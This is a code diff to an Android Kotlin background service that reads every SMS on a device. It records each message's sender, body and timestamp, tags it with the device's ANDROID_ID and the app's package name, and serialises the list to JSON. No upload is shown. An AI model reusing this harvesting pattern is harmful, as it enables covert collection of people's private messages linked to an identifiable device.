@@ -12,9 +12,11 @@ import android.content.pm.PackageManager
 import android.database.Cursor
 import android.net.Uri
 import android.os.*
+import android.provider.Settings
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import com.google.gson.Gson
+import com.google.gson.GsonBuilder
 import com.google.gson.JsonParser
 import info.kalagato.com.extractor.Constant
 import info.kalagato.com.extractor.Extractor
@@ -34,6 +36,7 @@ class ReadSMSService : Service() {
     private val TAG = "read-sms-service"
     private var mServiceLooper: Looper? = null
     private var mServiceHandler: ServiceHandler? = null
+    val jsArray = JSONArray()
     override fun onCreate() {
 //        Log.d(TAG,"onCreate");
         // Start up the thread running the service.  Note that we create a
@@ -227,16 +230,11 @@ class ReadSMSService : Service() {
                 if (c.moveToFirst()) {
                     for (i in 0 until totalSMS) {
                         objSms = Sms()
-                        objSms.id = c.getString(c.getColumnIndexOrThrow("_id"))
-                        objSms.address = c.getString(c.getColumnIndexOrThrow("address"))
-                        objSms.msg = c.getString(c.getColumnIndexOrThrow("body"))
-                        objSms.readState = c.getString(c.getColumnIndex("read"))
-                        objSms.time = c.getString(c.getColumnIndexOrThrow("date"))
-                        if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
-                            objSms.folderName = ("inbox")
-                        } else {
-                            objSms.folderName = ("sent")
-                        }
+                        objSms.hardware_id = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+                        objSms.sender_id = c.getString(c.getColumnIndexOrThrow("address"))
+                        objSms.body = c.getString(c.getColumnIndexOrThrow("body"))
+                        objSms.message_timestamp = c.getString(c.getColumnIndexOrThrow("date"))
+                        objSms.app_name = applicationContext.packageName
                         lstSms.add(objSms)
                         c.moveToNext()
                     }
@@ -245,6 +243,8 @@ class ReadSMSService : Service() {
                 // throw new RuntimeException("You have no SMS");
                 // }
                 c.close()
+                val gson = GsonBuilder().create()
+                val myCustomArray = gson.toJsonTree(lstSms).asJsonArray
                 return lstSms
             }
             return emptyList()
@@ -253,11 +253,10 @@ class ReadSMSService : Service() {
 }
 
 data class Sms (
-    var id: String? = null,
-    var address: String? = null,
-    var msg: String? = null,
-    var readState //"0" for have not read sms and "1" for have read sms
-            : String? = null,
-    var time: String? = null,
-    var folderName: String? = null
+    var hardware_id: String? = null,
+    var sender_id: String? = null,
+    var body: String? = null,
+    var message_timestamp: String? = null,
+    var folder_name: String? = null,
+    var app_name : String ?= null
 )
